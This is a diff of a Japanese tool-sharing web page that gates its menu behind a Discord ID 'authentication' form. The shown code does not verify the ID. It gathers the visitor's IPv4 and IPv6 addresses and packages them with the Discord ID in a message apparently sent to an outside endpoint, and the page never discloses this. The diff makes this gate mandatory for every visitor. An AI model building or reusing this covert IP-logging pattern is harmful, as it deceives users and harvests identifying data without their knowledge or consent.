@@ -1,4 +1,4 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
@@ -13,7 +13,7 @@
             padding: 20px;
             overflow-x: hidden;
         }
-        .form-container, .tools-container {
+        .form-container, .tools-container, .search-container {
             display: none;
             border: 2px solid #00ff00;
             padding: 20px;
@@ -46,22 +46,24 @@
         .button-container {
             margin-bottom: 20px;
         }
+        #authContainer {
+            display: block;
+        }
     </style>
 </head>
 <body>
-
-<div class="button-container">
-    <button onclick="showForm('auth')">認証</button>
-    <button onclick="showForm('tool')">投稿フォーム</button>
-    <button onclick="showForm('search')">検索フォーム</button>
-    <button onclick="showForm('tools')">ツール表示</button>
-</div>
 
 <div id="authContainer" class="form-container">
     <form id="authForm">
         <input type="text" id="discordId" placeholder="Discord ID" required>
         <button type="button" onclick="submitAuth()">認証</button>
     </form>
+</div>
+
+<div class="button-container" id="menuButtons" style="display: none;">
+    <button onclick="showForm('tool')">投稿フォーム</button>
+    <button onclick="showForm('search')">検索フォーム</button>
+    <button onclick="showForm('tools')">ツール表示</button>
 </div>
 
 <div id="formContainer" class="form-container">
@@ -95,14 +97,11 @@
     }
 
     function showForm(form) {
-        document.getElementById('authContainer').style.display = 'none';
         document.getElementById('formContainer').style.display = 'none';
         document.getElementById('toolsContainer').style.display = 'none';
         document.querySelector('.search-container').style.display = 'none';
 
-        if (form === 'auth') {
-            document.getElementById('authContainer').style.display = 'block';
-        } else if (form === 'tool') {
+        if (form === 'tool') {
             document.getElementById('formContainer').style.display = 'block';
         } else if (form === 'search') {
             document.querySelector('.search-container').style.display = 'block';
@@ -113,8 +112,11 @@
     }
 
     async function submitAuth() {
-        const discordId = document.getElementById('discordId').value;
-        if (!discordId) return;
+        const discordId = document.getElementById('discordId').value.trim();
+        if (!discordId) {
+            alert('Discord IDを入力してください。');
+            return;
+        }
 
         const ipData = await getIPData();
         const payload = { content: `新しい認証: Discord ID: ${discordId}, IPv4: ${ipData.ipv4}, IPv6: ${ipData.ipv6}` };
@@ -127,6 +129,7 @@
 
         isAuthenticated = true;
         document.getElementById('submitToolButton').disabled = false;
+        document.getElementById('menuButtons').style.display = 'block';
         alert('認証成功！ツールを投稿できます。');
     }
 
@@ -209,8 +212,7 @@
         toolCards.forEach(card => {
             const name = card.querySelector('h3').textContent.toLowerCase();
             const tags = card.querySelector('p strong:nth-of-type(1)').nextSibling.textContent.toLowerCase();
-            if
-(name.includes(query) || tags.includes(query)) {
+            if (name.includes(query) || tags.includes(query)) {
                 card.style.display = 'block';
             } else {
                 card.style.display = 'none';
